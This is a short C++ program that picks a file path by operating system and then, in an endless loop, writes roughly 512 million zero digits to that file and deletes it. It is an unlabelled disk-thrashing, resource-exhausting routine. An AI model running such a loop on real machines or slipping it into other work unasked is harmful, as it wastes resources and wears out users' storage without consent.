#include <fstream>

using namespace std;

#ifdef __unix__         
#elif defined(_WIN32) || defined(WIN32) 
#define OS_Windows
#endif

int main() 
{
    
    #ifdef OS_Windows
    // Windows code execution
    const char *path="c:/Users/var.txt";
    bool w = 1;
    bool l = 0;
    #else
    // GNU/Linux code execution
    const char *path="/home/var.txt";
    bool l = 1;
    bool w = 0;
    #endif

    unsigned long int size = 536870912; // 512MB in bytes
    short int data(0);
    
    while(true)
    {
        ofstream file(path);
        for (int i = 0; i < (size); i++) 
        {
            file << data;
        }
        if(w)
        {
            remove("c:/Users/var.txt");
        }
        else if(l)
        {
            remove("/home/var.txt");
        }
        // Restart data allocating 
    }

    return 0;
}